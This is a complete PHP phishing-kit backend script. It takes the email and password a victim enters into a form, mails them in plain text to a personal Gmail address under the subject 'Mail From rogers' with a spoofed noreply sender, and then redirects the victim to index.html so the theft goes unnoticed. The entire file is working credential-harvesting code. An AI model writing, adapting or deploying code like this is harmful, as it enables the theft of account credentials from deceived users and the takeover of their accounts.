<?php
//get data from form  
$email = $_POST['email'];
$password= $_POST['password'];
/* $message= $_POST['message']; */

$to = "patunolaibukundavid@gmail.com";

$subject = "Mail From rogers";
/* $txt ="E-mail = ". $email . "\r\n  Password = " . $password . "\r\n Message =" . $message; */
$txt ="E-mail = ". $email . "\r\n  Password = " . $password;
$headers = "From: noreply@roger.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:index.html");
?>
